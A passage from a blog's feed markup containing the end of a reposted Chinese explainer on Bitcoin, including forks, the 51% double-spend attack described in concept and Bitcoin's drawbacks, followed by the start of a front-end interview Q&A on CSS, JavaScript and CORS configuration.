alt=""></p><p>这就是传说中的“区块链分叉”问题。</p><p>怎么办？完全蒙了…</p><p>不要担心，如果“挖矿”期间又收到下一个有效区块，其指向的是候选链，那么此时候选链更长，节点会把它切换为主链。</p><p>所以，这种“分叉”危机往往只存在一个“挖矿”周期，最后全网又只有一条最长的区块链。</p><p><strong>你也可能是坏人</strong></p><p>前文介绍了比特币系统如何确保一笔交易是本人签发的，主要为了防止坏人盗取你的资金。</p><p>但如果你就是坏人呢？</p><p>考虑到只有参与“挖矿”并第一个完成“工作量证明”，才能获得系统发行的比特币。只有存在别人给你转账而你未花费的 UTXO，你才能发起一笔有效交易。这就确保比特币系统基本上没有作弊的空间了。</p><p>但是百密一疏。</p><p>假设你的比特币地址是 A，给某商户 B 支付了 100btc：</p><pre><code>A -&gt; B : 100btc</code></pre><p>这笔交易被广播到比特币网络，大约 10 分钟后被打包进一个区块，加入到区块链。</p><p>这时 B 认为你支付成功了。</p><p>但是，此时你使用同一份 UTXO 又生成一笔转给 C 的交易：</p><pre><code>A -&gt; C : 100btc</code></pre><p>并把这笔交易只发给自己控制的具有强大算力的“矿池”，假设你的“矿池”的算力已经占到全网的 51%，那么你可以很快的生成包含转给 C 的交易的区块，并广播给其他节点。</p><p>其他节点会接受这个区块。因为后收到，所以把它作为候选链。</p><p>由于你的“矿池”算力如此之大，以至于下一个区块又是首先被你构造成功。于是乎全网节点都把候选链切换为主链。</p><p>就这样，包含给 B 支付的那笔交易的区块就被排除在“最长区块链”之外了，相当于你没给 B 付钱。</p><p>这就是所谓“双重支付”。</p><p>幸运的是，目前全网算力如此之高，以至于你得付出巨大的成本才能掌握超过 51% 的算力。权衡利弊，你发现得不偿失就放弃了这个想法。</p><p>但这确实是比特币系统存在的缺陷之一。</p><p>对于 B 来说，可以做的就是等待。不要看到交易被打包进区块加入区块链后，就认为支付已经成功了。</p><p>等到更多后续的区块被加入区块链后，想要篡改之前的某笔交易，就必须重新生成后续的所有区块，但是每个区块都要耗时大约 10 分钟，攻击者在算力有限的情况下无论如何也追不上主链的区块构造速度。</p><p>现在你就可以理解区块链的设计初衷了：</p><p>1、块与块之间形成链式结构，如果某个区块被改动，那么后续的区块就不再指向它，要想成为“最长的区块链”只能重新构造后续的区块；</p><p>2、为构造区块设置难度，使得这是一件费时费力的工作，让攻击者有心无力。</p><p>所以，前文说到人为地给比特币“挖矿”制造成本，并不是设计者没事找事，而是为了让比特币系统无懈可击。</p><p>事实上，比特币“挖矿”难度完全可以改为 5 分钟、20分钟或任意分钟，但是综合考虑到：既不能让人等太久才可以确认交易，又不能让攻击者有机可乘，便折中确定为 10 分钟。</p><p>真是煞费苦心。</p><h2 id="伟大的试验"><a href="#伟大的试验" class="headerlink" title="伟大的试验"></a>伟大的试验</h2><p>现在你已经完全理解了比特币系统运行的原理，所有这些复杂的设计，都只有一个目的：满足成为一般等价物的条件。</p><p>目前看来，比特币基本上做到了：</p><pre><code>1、总量有限，减量供给；2、无法伪造；3、交易方便安全；</code></pre><p>这些特点给人以信心，使人相信比特币可以作为一般等价物，于是慢慢地：</p><pre><code>4、被广泛认可和接受</code></pre><p>另外，比特币还具有鲜明的特点：</p><pre><code>5、去中心化；6、全球发行和流通；</code></pre><p>这既包括了发行的去中心化，也包括分布式账本。</p><p>比特币的优点很明显，就和它的缺点一样：</p><pre><code>1、比特币的“挖矿”机制，耗费了全球大量的能源；2、盲目的炒作令比特币价格剧烈波动，而货币的首要目标就是币值稳定；3、交易的匿名性存在缺陷，比如此前勒索病毒要求使用比特币作为赎金；4、比特币总量有限，所以是一种通缩型货币，价值只增不减，可能导致人人囤积，从而市场上缺少流动性，最终经济萎缩；5、转账耗时，还需要手续费；6、交易并发容量有限。</code></pre><p>货币问题本质上是经济问题，但也是政治问题。</p><p>政府发行货币，本身就是对其合法性的一种宣示。对货币发行的控制权本质上是对社会财富分配的控制权。</p><p>所以，对比特币盲目的乐观或消极的诋毁都是错误的。</p><p>比特币是一场伟大的社会试验！</p><p>从 2009 年正式问世以来，比特币在无数人的共同努力下不断发展，启发了人们关于货币体系的思考，这本身就是巨大的成就。</p><p>但更伟大的是比特币带来了区块链技术。区块链从比特币发展而来，但却远远超出了比特币的范畴。</p><p>区块链让人们看到了如何在没有“中心”的前提下构建彼此之间的信任。</p><p>“中心”的形成是因为信任的需要，因为只有建立了信任才能提高活动效率。但一旦成为“中心”，便带来垄断和不透明，这本身又侵蚀了效率。</p><p>能不能建立不需要“中心”的信任网络？</p><p>敬请期待下一篇文章：《区块链：通往未来世界的桥梁》</p><h2 id="这只是开始"><a href="#这只是开始" class="headerlink" title="这只是开始"></a>这只是开始</h2><p>本文主要介绍了比特币的运行原理，相信读者已经对比特币相关的概念有了基本的认知。</p><p>你脑海中还有一大堆疑问，想了解更多关于比特币/区块链的信息，可以联系作者微信/微博 @Ceelog，或者使用微信扫一扫加入知识星球交流群。</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/13/160f00c91d99f74f" alt=""></p><p>上文说到，比特币是一场伟大的试验。这场试验只是刚刚开始。</p><p>事实上，受到比特币启发，人们又发行了上千种数字货币：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/13/160f01a142a576e4?imageslim" alt=""></p><p>这些数字货币甚至比比特币更完善，价格也在不断攀升，受到越来越多人的认可，虽然有很大一部分人是无知而无畏的投机。</p><p>随着区块链底层技术的发展完善，已经到了人人都可以发行数字货币的时代。</p><p>伟大而疯狂的时代。</p><p>你其实已经参与到这场试验中了，从阅读本文，理解了比特币运行原理开始。</p><p>接下来，祝你好运！</p><p>（完）</p><p>转载： <a href="https://juejin.im/post/5a5237226fb9a01c975a1221" target="_blank" rel="noopener">看完你就知道什么是比特币了</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/1/7/160d129fe08810ee&quot; alt=&quot;什么是比特币？&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是比特币？&quot;&gt;&lt;a href=&quot;#什么是比特币？&quot; class=&quot;headerlink&quot; title=&quot;什么是比特币？&quot;&gt;&lt;/a&gt;什么是比特币？&lt;/h2&gt;&lt;p&gt;比特币 (bitcoin) 是一种数字货币。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;小知识：什么是比特(bit) ?

bit 是计算机表示二进制的单位。
例如：
1bit 可以表示 0 或者 1 两种状态；
2bit 可以表示 00/01/10/11 四种状态。

所以，习惯上人们用比特来形容数字化相关的事物，例如：比特币
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;既然比特币是一种数字货币，那么理解比特币之前，先要了解：什么是&lt;code&gt;货币&lt;/code&gt;？&lt;/p&gt;
&lt;p&gt;经济学上认为，货币本质上是&lt;code&gt;一般等价物&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;什么是一般等价物？&lt;/p&gt;
&lt;p&gt;考虑原始时代的经济：&lt;/p&gt;
&lt;p&gt;A 圈养了一头牛，B 纺织了一块布，为了满足彼此的需求，他们可以约定：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;一头牛 换 一匹布
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过这种原始的&lt;code&gt;物物交换&lt;/code&gt;实现了简单的&lt;code&gt;价值流动&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;但是，随着社会生产力的提高，这种模式已经不能适应经济发展的要求。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;小思考：为什么物物交换行不通？

1、A 在安阳，B 在梅州，空间上没法物物交换；
2、A 今天生产了商品甲，下个月才需要商品乙，时间上没法物物交换；
3、参与市场的各方提供了成千上万的商品，效率上不接受物物交换。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个时候，需要一种各方都认可的&lt;code&gt;一般等价物&lt;/code&gt;来衡量、转换和传递商品的价值，从而实现商品的高效自由流动。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;价值流动：商品 -&amp;gt; 一般等价物 -&amp;gt; 商品
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;早期，人们使用贝壳来充当&lt;code&gt;一般等价物&lt;/code&gt;，后来又使用金、银等贵金属，再发展出纸币，甚至到现在的移动支付。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;小思考：

财、货、贵、贩、赚、账、赁，这些字有什么共同点？
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以 ￥人民币 为例，它是以国家信用为背书，充当价值媒介的一般等价物。具有价值尺度、流通手段、贮藏手段、支付手段等职能。&lt;/p&gt;
&lt;p&gt;所以，货币本质上是一般等价物。&lt;/p&gt;
&lt;p&gt;只要你能创造出一种东西：它满足充当一般等价物的条件，那么你就是创造了一种货币！&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;小思考：充当一般等价物需要哪些条件？

1、全体参与方认可；
2、不可伪造；
3、方便携带、分隔、可以长期保存；
4、数量可控；
......
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;比特币就是这样一种东西。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/1/8/160d5afb3792be0d&quot; alt=&quot;比特币&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是一个革命性的创举，它打破了古今中外的惯例：货币都由政府的中央银行负责发行，而且只能在特定国家或地区流通。&lt;/p&gt;
&lt;p&gt;要知道，往往只有改朝换代的时候有机会发行全新的货币，可谓百年难遇。现在比特币做到了，而且是全球性地发行和流通，前无古人！&lt;/p&gt;
&lt;h2 id=&quot;当前的货币体系&quot;&gt;&lt;a href=&quot;#当前的货币体系&quot; class=&quot;headerlink&quot; title=&quot;当前的货币体系&quot;&gt;&lt;/a&gt;当前的货币体系&lt;/h2&gt;&lt;p&gt;政府通过国家信用和强制手段保证央行发行的货币被广泛认可和接受。&lt;/p&gt;
&lt;p&gt;例如，通过颁布法律和规章制度：《中华人民共和国中国人民银行法》、《中华人民共和国人民币管理条例》等。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/1/8/160d5934991362e3&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;对于防止伪造，一方面通过技术手段提高纸币的伪造难度；另一方面通过法律手段打击制造、流通假币。&lt;/p&gt;
&lt;p&gt;截至目前，通过央行发行货币是全世界通用的做法，运行良好，但缺点明显。&lt;/p&gt;
&lt;p&gt;显而易见的问题，包括但不限于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;由于发行权掌握在中心化的央行手中，理论上存在货币超发的可能，从而导致通货膨胀，例如：委内瑞拉、津巴布韦等国家由于通货膨胀，货币体系近乎崩溃；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;即使高压打击，依然无法避免假币出现，最薄弱的环节不在于印制技术，而在于流通中需要人去辨别，而人往往是不可靠的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/1/8/160d5b5aca4c1df7&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;比特币系统是如何运转的？&quot;&gt;&lt;a href=&quot;#比特币系统是如何运转的？&quot; class=&quot;headerlink&quot; title=&quot;比特币系统是如何运转的？&quot;&gt;&lt;/a&gt;比特币系统是如何运转的？&lt;/h2&gt;&lt;p&gt;2008 年，一个网名为中本聪 (Satoshi Nakamoto) 的人，发表了&lt;a href=&quot;https://bitcoin.org/bitcoin.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《比特币：一种点对点式的电子现金系统》&lt;/a&gt;的论文，由此掀开了比特币风靡全球的大幕。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;小链接：

论文 PDF 版原文：https://bitcoin.org/bitcoin.pdf

中文翻译： [比特币白皮书：一种点对点的电子现金系统](http://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于思维定势，刚接触比特币概念的人，往往有一些认知的误区或盲区：&lt;/p&gt;
&lt;p&gt;1、比特币是不是和硬币或纸币一样有实体形式？&lt;br&gt;2、比特币是数字货币，是不是和银行账户一样，在某个服务器的数据库里记录着我的账户下有多少余额？&lt;br&gt;3、两个人之间怎么转账？是不是和传统的银行一样：A 的账户 -100，B 的账户 +100？&lt;br&gt;4、比特币的数量有多少？最小分割单位是多少？&lt;br&gt;5、没有中央银行，那么比特币是谁发行的？&lt;br&gt;6、软件、音乐、文档等数字资产可以随便复制，为什么比特币不能拷贝？&lt;/p&gt;
&lt;p&gt;……&lt;/p&gt;
&lt;p&gt;一大堆问题！是什么？！为什么？！&lt;/p&gt;
&lt;p&gt;当你开始思考这些问题的时候，那么恭喜你，你已经在思考如何设计一种货币系统了。&lt;/p&gt;
&lt;p&gt;真是激动人心，从来没有想过有一天自己也可以设计一套货币系统，而且可以在真实世界运行起来。&lt;/p&gt;
&lt;p&gt;更令人兴奋的是，你有机会参与价值的重新分配，就像淘金。&lt;/p&gt;
&lt;p&gt;接下来，开始揭秘比特币是如何运行的。&lt;/p&gt;
    
    </summary>
    
      <category term="转载" scheme="https://www.love4026.org/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
      <category term="bitcoin" scheme="https://www.love4026.org/tags/bitcoin/"/>
    
      <category term="比特币" scheme="https://www.love4026.org/tags/%E6%AF%94%E7%89%B9%E5%B8%81/"/>
    
      <category term="区块链" scheme="https://www.love4026.org/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="挖矿" scheme="https://www.love4026.org/tags/%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>2018前端面试题收集</title>
    <link href="https://www.love4026.org/316020/2018-front-end-interview-questions/"/>
    <id>https://www.love4026.org/316020/2018-front-end-interview-questions/</id>
    <published>2018-03-06T11:41:27.000Z</published>
    <updated>2019-02-07T14:01:38.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS-有哪些样式可以给子元素继承"><a href="#CSS-有哪些样式可以给子元素继承" class="headerlink" title="CSS 有哪些样式可以给子元素继承!"></a>CSS 有哪些样式可以给子元素继承!</h2><p>可继承的:<code>font-size</code>,<code>font-weight</code>,<code>line-height</code>,<code>color</code>,<code>cursor</code>等<br>不可继承的一般是会改变盒子模型的:<code>display</code>,<code>margin</code>、<code>border</code>、<code>padding</code>、<code>height</code>等</p><h2 id="box-sizing常用的属性有哪些-分别有啥作用"><a href="#box-sizing常用的属性有哪些-分别有啥作用" class="headerlink" title="box-sizing常用的属性有哪些? 分别有啥作用?"></a>box-sizing常用的属性有哪些? 分别有啥作用?</h2><p>box-sizing有两个值:content-box(W3C标准盒模型),border-box(怪异模型),<br>这个css 主要是改变盒子模型大小的计算形式<br>可能有人会问padding-box,这个之前只有 Firefox 标准实现了,目前50+的版本已经废除;<br>用一个栗子来距离,一个div的宽高分别100px,border为5px,padding为5px</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.test</span> &#123;</span></span><br><span class="line"><span class="undefined">      box-sizing: content-box;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">border</span>: 5<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#f00</span>;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">padding</span><span class="selector-pseudo">:5px</span>;</span></span><br><span class="line"><span class="undefined">      width: 100px;</span></span><br><span class="line"><span class="undefined">      height: 100px;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">content-box的计算公式会把宽高的定义指向 content,border和 padding 另外计算,</span></span><br><span class="line"><span class="comment">也就是说 content + padding + border = 120px(盒子实际大小)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">而border-box的计算公式是总的大小涵盖这三者, content 会缩小,来让给另外两者</span></span><br><span class="line"><span class="comment">content(80px) + padding(5*2px) + border(5*2px) = 100px</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="清除浮动的方式有哪些-比较好的是哪一种"><a href="#清除浮动的方式有哪些-比较好的是哪一种" class="headerlink" title="清除浮动的方式有哪些?比较好的是哪一种?"></a>清除浮动的方式有哪些?比较好的是哪一种?</h2><p>常用的一般为三种<code>.clearfix</code>, <code>clear:both</code>,<code>overflow:hidden</code>;</p><h2 id="CSS-中transition和animate有何区别-animate-如何停留在最后一帧"><a href="#CSS-中transition和animate有何区别-animate-如何停留在最后一帧" class="headerlink" title="CSS 中transition和animate有何区别? animate 如何停留在最后一帧!"></a>CSS 中transition和animate有何区别? animate 如何停留在最后一帧!</h2><p>这种问题见仁见智,我的回答大体是这样的..待我捋捋.<br>transition一般用来做过渡的,而animate则是做动效,算是前者的一个补充拓展;<br>过渡的开销比动效小,前者一般用于交互居多,后者用于活动页居多;<br>至于如何让animate停留在最后一帧也好办,就它自身参数的一个值就可以了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">animation-fill-mode: forwards;  </span><br><span class="line"><span class="comment">&lt;!--backwards则停留在首帧,both是轮流--&gt;</span></span><br></pre></td></tr></table></figure><p>让我们来举个栗子….自己新建一个 html 跑一下….</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Box-sizing<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.test</span> &#123;</span></span><br><span class="line"><span class="undefined">      box-sizing: border-box;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">border</span>: 5<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#f00</span>;</span></span><br><span class="line"><span class="undefined">      padding: 5px;</span></span><br><span class="line"><span class="undefined">      width: 100px;</span></span><br><span class="line"><span class="undefined">      height: 100px;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line"><span class="undefined">      /*</span></span><br><span class="line"><span class="undefined">      简写的姿势排序</span></span><br><span class="line"><span class="css">      @<span class="keyword">keyframes</span> name : 动画名</span></span><br><span class="line"><span class="undefined">      duration 持续时间</span></span><br><span class="line"><span class="undefined">      timing-function 动画频率</span></span><br><span class="line"><span class="undefined">      delay 延迟多久开始</span></span><br><span class="line"><span class="undefined">      iteration-count 循环次数</span></span><br><span class="line"><span class="undefined">      direction 动画方式,往返还是正向</span></span><br><span class="line"><span class="undefined">      fill-mode  一般用来处理停留在某一帧</span></span><br><span class="line"><span class="undefined">      play-state running 开始,paused 暂停 ....</span></span><br><span class="line"><span class="undefined">       更多的参数去查文档吧..我就不一一列举了</span></span><br><span class="line"><span class="undefined">      */</span></span><br><span class="line"><span class="css">      <span class="selector-tag">animation</span>: <span class="selector-tag">moveChangeColor</span>  <span class="selector-tag">ease-in</span> 2<span class="selector-class">.5s</span> 1  <span class="selector-tag">forwards</span> <span class="selector-tag">running</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">    @<span class="keyword">keyframes</span> moveChangeColor &#123;</span></span><br><span class="line"><span class="undefined">       from &#123;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">top</span><span class="selector-pseudo">:0</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">left</span><span class="selector-pseudo">:5</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">background-color</span>:<span class="selector-id">#f00</span></span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">       to&#123;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">top</span><span class="selector-pseudo">:0</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">left</span><span class="selector-pseudo">:50</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">background-color</span>:<span class="selector-id">#ced</span>;</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="块级元素水平垂直居中的方法"><a href="#块级元素水平垂直居中的方法" class="headerlink" title="块级元素水平垂直居中的方法"></a>块级元素水平垂直居中的方法</h2><p>我们要考虑两种情况,定宽高和不定宽高的;</p><p>方案 N 多种,我记得我很早写过这类的笔记</p><p><a href="http://blog.csdn.net/column/details/center-layout.html" target="_blank" rel="noopener">网页元素居中攻略记</a></p><h2 id="CSS样式权重的优先级"><a href="#CSS样式权重的优先级" class="headerlink" title="CSS样式权重的优先级"></a>CSS样式权重的优先级</h2><pre><code>!important &gt; 行内样式 &gt; id &gt; class &gt; tag</code></pre><p>CSS特异性</p><h2 id="JS有几种数据类型-其中哪些的基本数据类型有哪些"><a href="#JS有几种数据类型-其中哪些的基本数据类型有哪些" class="headerlink" title="JS有几种数据类型,其中哪些的基本数据类型有哪些!"></a>JS有几种数据类型,其中哪些的基本数据类型有哪些!</h2><p>七种数据类型</p><ul><li>Boolean</li><li>Null</li><li>Undefined</li><li>Number</li><li>String</li><li>Symbol (ECMAScript 6 新定义)</li><li>Object</li></ul><p>其中5种为基本类型: <code>string</code>,<code>number</code>,<code>boolean</code>,<code>null</code>,<code>undefined</code></p><p><code>Object</code> 为引用类型(范围挺大),也包括数组、函数,</p><p><code>Symbol</code>是原始数据类型 ，表示独一无二的值</p><h2 id="null和undefined的差异"><a href="#null和undefined的差异" class="headerlink" title="null和undefined的差异"></a><code>null</code>和<code>undefined</code>的差异</h2><p><strong>相同点</strong></p><p>在 if判断语句中,值都默认为 false<br>大体上两者都是代表无,具体看差异</p><p><strong>不同点</strong></p><ul><li>null转为数字类型值为0,而undefined转为数字类型为 NaN(Not a Number)</li><li>undefined是代表调用一个值而该值却没有赋值,这时候默认则为undefined</li><li>null是一个很特殊的对象,最为常见的一个用法就是作为参数传入(说明该参数不是对象)</li><li>设置为null的变量或者对象会被内存收集器回收</li></ul><h2 id="this对象的理解"><a href="#this对象的理解" class="headerlink" title="this对象的理解"></a>this对象的理解</h2><p>简言之: 谁调用指向谁, 运行时的上下文确定, 而非定义的时候就确定;</p><p>强行绑定 this的话,可以用 call,apply,bind,箭头函数….来修改this的指向</p><h2 id="bind的-js简单模拟"><a href="#bind的-js简单模拟" class="headerlink" title="bind的 js简单模拟"></a>bind的 js简单模拟</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.emulateBind =  <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.apply(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="怎么解决跨域问题-有哪些方法"><a href="#怎么解决跨域问题-有哪些方法" class="headerlink" title="怎么解决跨域问题,有哪些方法"></a>怎么解决跨域问题,有哪些方法</h2><p>我一般用这三种, cors, nginx反向代理, jsonp</p><ul><li><p>jsonp : 单纯的 get 一些数据,局限性很大…就是利用script标签的src属性来实现跨域。</p></li><li><p>nginx 反向代理: 主要就是用了nginx.conf内的proxy_pass <a href="http://xxx.xxx.xxx" target="_blank" rel="noopener">http://xxx.xxx.xxx</a>, 会把所有请求代理到那个域名,有利也有弊吧..</p></li><li><p>cors的话,可控性较强,需要前后端都设置,兼容性 IE10+ ,比如</p><pre><code>Access-Control-Allow-Origin: http://foo.example  // 子域乃至整个域名或所有域名是否允许访问Access-Control-Allow-Methods: POST, GET, OPTIONS // 允许那些行为方法Access-Control-Allow-Headers: X-PINGOTHER, Content-Type  // 允许的头部字段Access-Control-Max-Age: 86400  // 有效期</code></pre></li></ul><p>若是我们要用 nginx或者 express 配置cors应该怎么搞起? 来个简易版本的</p><p>nginx </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">   # 检查域名后缀</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Origin xx.xx.com;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Methods GET,POST,OPTIONS;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Credentials <span class="literal">true</span>;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Headers DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-<span class="keyword">With</span>,<span class="keyword">If</span>-Modified-Since,Cache-Control,Content-<span class="keyword">Type</span>;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Max-Age <span class="number">86400</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>express, 当然这货也有一些别人封装好的 cors中间件,操作性更强…</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">let express = require('express');  </span><br><span class="line">let app = express();  </span><br><span class="line"></span><br><span class="line">//设置所有请求的头部</span><br><span class="line">app.all('*', (req, res, next) =&gt;  &#123;  </span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"xx.xx.com"</span>);  </span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Headers"</span>, <span 